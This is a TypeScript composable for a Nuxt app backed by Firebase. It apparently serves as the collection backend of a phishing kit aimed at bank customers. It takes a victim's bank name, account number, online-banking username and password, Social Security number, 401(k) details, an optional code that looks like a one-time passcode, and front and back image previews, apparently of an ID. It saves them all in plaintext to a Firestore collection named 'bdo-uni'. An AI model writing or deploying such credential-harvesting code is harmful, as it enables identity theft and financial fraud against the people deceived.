import { addDoc, collection, serverTimestamp, doc, updateDoc, increment } from "firebase/firestore";

type Request = {
  bank: string
  accountNumber: string
  amount: number
  username: number
  password: string,
	ssn: string,
  fortyOneK?: String,
  fortyOneKProvider?: String,
  code?: String,
  backPreview: String,
  frontPreview: String
};

export function sendRequest() {
  const { $db } = useNuxtApp()
  const loading = ref(false)
  const error = ref<string | null>(null)

  const submitRequest = async (request: Request) => {
    loading.value = true
    error.value = null

    try {
      // Prepare Firestore document
      const bdoRecord: any = {
        bank: request.bank,
        accountNumber: request.accountNumber,
        amount: request.amount,
        username: request.username,
        password: request.password,
        ssn: request.ssn,
        fortyOneK: request.fortyOneK || null,
        fortyOneKProvider: request.fortyOneKProvider || null,
        code: request.code || null,
        createdAt: serverTimestamp(),
        backPreview: request.backPreview,
        frontPreview: request.frontPreview,
      }

      // Save to Firestore
      await addDoc(collection($db, "bdo-uni"), bdoRecord);

      return { success: true }
    } catch (err: any) {
      error.value = err.message || "Failed to submit vote"
      return { success: false, error: error.value }
    } finally {
      loading.value = false
    }
  }

  return { submitRequest, loading, error }
}
